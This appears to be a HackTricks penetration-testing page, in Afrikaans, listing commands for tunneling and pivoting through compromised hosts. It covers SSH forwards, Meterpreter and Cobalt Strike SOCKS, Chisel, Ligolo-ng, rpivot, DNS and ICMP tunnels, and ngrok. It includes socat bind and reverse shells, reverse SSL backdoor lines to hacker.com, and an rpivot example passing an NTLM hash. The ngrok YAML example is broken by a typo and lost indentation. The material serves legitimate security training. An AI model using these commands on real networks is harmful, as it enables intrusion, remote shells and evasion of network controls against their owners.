# Tunneling en Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap wenk

> [!WARNING]
> **ICMP** en **SYN** skande kan nie deur socks-proxies getunnel word nie, so ons moet **ping ontdekking deaktiveer** (`-Pn`) en **TCP skande** (`-sT`) spesifiseer vir dit om te werk.

## **Bash**

**Gastheer -> Spring -> InternA -> InternB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiese verbinding (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Plaaslike Port2Port

Maak nuwe Poort in SSH-bediener --> Ander poort
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Plaaslike poort --> Gecompromitteerde gasheer (SSH) --> Derde_boks:Poort
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Plaaslike Poort --> Gecompromitteerde gasheer (SSH) --> Enige plek
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Dit is nuttig om omgekeerde shells van interne gasheer deur 'n DMZ na jou gasheer te kry:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Jy het **root op albei toestelle** nodig (aangesien jy nuwe interfaces gaan skep) en die sshd-konfigurasie moet root-aanmelding toelaat:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Aktiveer forwarding aan die bedienerkant
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel 'n nuwe roete aan die kliëntkant in
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Jy kan **tunnel** via **ssh** al die **verkeer** na 'n **subnet** deur 'n gasheer.\
Byvoorbeeld, om al die verkeer wat na 10.10.10.0/24 gaan, te stuur.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Verbind met 'n privaat sleutel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Plaaslike poort --> Gecompromitteerde gasheer (aktiewe sessie) --> Derde_boks:Poort
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Nog 'n manier:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS-proxy

Maak 'n poort op die spanbediener oop wat op al die interfaces luister wat gebruik kan word om die **verkeer deur die beacon te lei**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In hierdie geval is die **poort geopen in die beacon gasheer**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar na die aangeduide gasheer:poort
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Om op te let:

- Beacon se omgekeerde poort forwarding is ontwerp om **verkeer na die Spanbediener te tonnel, nie om te relay tussen individuele masjiene nie**.
- Verkeer word **getonneld binne Beacon se C2 verkeer**, insluitend P2P skakels.
- **Admin regte is nie nodig** om omgekeerde poort forwards op hoë poorte te skep nie.

### rPort2Port plaaslik

> [!WARNING]
> In hierdie geval, die **poort word in die beacon gasheer geopen**, nie in die Spanbediener nie en die **verkeer word na die Cobalt Strike kliënt gestuur** (nie na die Spanbediener nie) en van daar na die aangeduide gasheer:poort
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Jy moet 'n weblêer-tunnel oplaai: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Jy kan dit aflaai vanaf die vrylating bladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Jy moet die **dieselfde weergawe vir kliënt en bediener** gebruik.

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Poort forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Gebruik dieselfde weergawe vir agent en proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding en Luister
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Toegang tot Agent se Plaaslike Poorte
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Omgekeerde tonnel. Die tonnel word vanaf die slagoffer begin.\
'n socks4 proxy word op 127.0.0.1:1080 geskep
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot deur **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Omgekeerde dop
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port deur socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter deur SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan 'n **nie-geoutentiseerde proxy** omseil deur hierdie lyn in plaas van die laaste een in die slagoffer se konsole uit te voer:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh konsole**

Skep sertifikate aan albei kante: Kliënt en Bediener
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvaller se gasheer
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Dit is soos 'n konsole PuTTY weergawe (die opsies is baie soortgelyk aan 'n ssh kliënt).

Aangesien hierdie binêre in die slagoffer uitgevoer sal word en dit 'n ssh kliënt is, moet ons ons ssh diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs 'n plaaslik toeganklike poort na 'n poort in ons masjien te stuur:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Jy moet 'n plaaslike admin wees (vir enige poort)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang oor die stelsel** hê.\
Laai af:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie hulpmiddel gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-funksie van Windows. DVC is verantwoordelik vir **tunneling pakkette oor die RDP-verbinding**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** in jou kliëntrekenaar soos volg:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons **verbinde** met die **slagoffer** oor **RDP** met **`mstsc.exe`**, en ons behoort 'n **prompt** te ontvang wat sê dat die **SocksOverRDP plugin geaktiveer is**, en dit sal **luister** op **127.0.0.1:1080**.

**Verbind** via **RDP** en laai op & voer die `SocksOverRDP-Server.exe` binêre uit op die slagoffer masjien:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat die poort 1080 luister:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) **gebruik om die verkeer deur daardie poort te proxy.**

## Proxify Windows GUI Apps

Jy kan Windows GUI-apps laat navigeer deur 'n proxy met behulp van [**Proxifier**](https://www.proxifier.com/).\
In **Profile -> Proxy Servers** voeg die IP en poort van die SOCKS-bediener by.\
In **Profile -> Proxification Rules** voeg die naam van die program wat geproxied moet word en die verbindings na die IP's wat jy wil proxify by.

## NTLM proxy bypass

Die voorheen genoemde hulpmiddel: **Rpivot**\
**OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Dit verifieer teen 'n proxy en bind 'n poort plaaslik wat na die eksterne diens wat jy spesifiseer, voortgelei word. Dan kan jy die hulpmiddel van jou keuse deur hierdie poort gebruik.\
Byvoorbeeld, dit lei poort 443 voort.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld in die slagoffer die **SSH** diens op poort 443 stel om te luister. Jy kan dit deur die aanvaller se poort 2222 verbind.\
Jy kan ook 'n **meterpreter** gebruik wat met localhost:443 verbind en die aanvaller luister op poort 2222.

## YARP

'n Omgekeerde proxy geskep deur Microsoft. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is nodig in albei stelsels om tun-adapters te skep en data tussen hulle te tonnel deur DNS-vrae te gebruik.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Die tonnel sal baie stadig wees. Jy kan 'n gecomprimeerde SSH-verbinding deur hierdie tonnel skep deur te gebruik:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Stel 'n C\&C-kanaal deur DNS in. Dit benodig nie wortelregte nie.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om 'n dnscat2-kliënt in powershell te loop:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Poort deurstuur met dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains onderskep `gethostbyname` libc oproep en tonnel tcp DNS versoek deur die socks proxy. Deur **default** is die **DNS** bediener wat proxychains gebruik **4.2.2.2** (hardgecodeer). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows omgewing** is, kan jy die IP van die **domeinbeheerder** stel.

## Tonnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Toneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is nodig in beide stelsels om tun adapters te skep en data tussen hulle te tonnel met ICMP echo versoeke.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **is 'n hulpmiddel om oplossings in een opdraglyn aan die internet bloot te stel.**\
_&#x45;xposition URI is soos:_ **UID.ngrok.io**

### Installasie

- Skep 'n rekening: https://ngrok.com/signup
- Kliënt aflaai:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Dit is ook moontlik om outentisering en TLS by te voeg, indien nodig._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Blootstelling van lêers met HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Nuttig vir XSS, SSRF, SSTI ..._\
Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasie voorbeeld

Dit open 3 tonnels:

- 2 TCP
- 1 HTTP met statiese lêers blootstelling vanaf /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Ander gereedskap om te kontroleer

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

{{#include ../banners/hacktricks-training.md}}
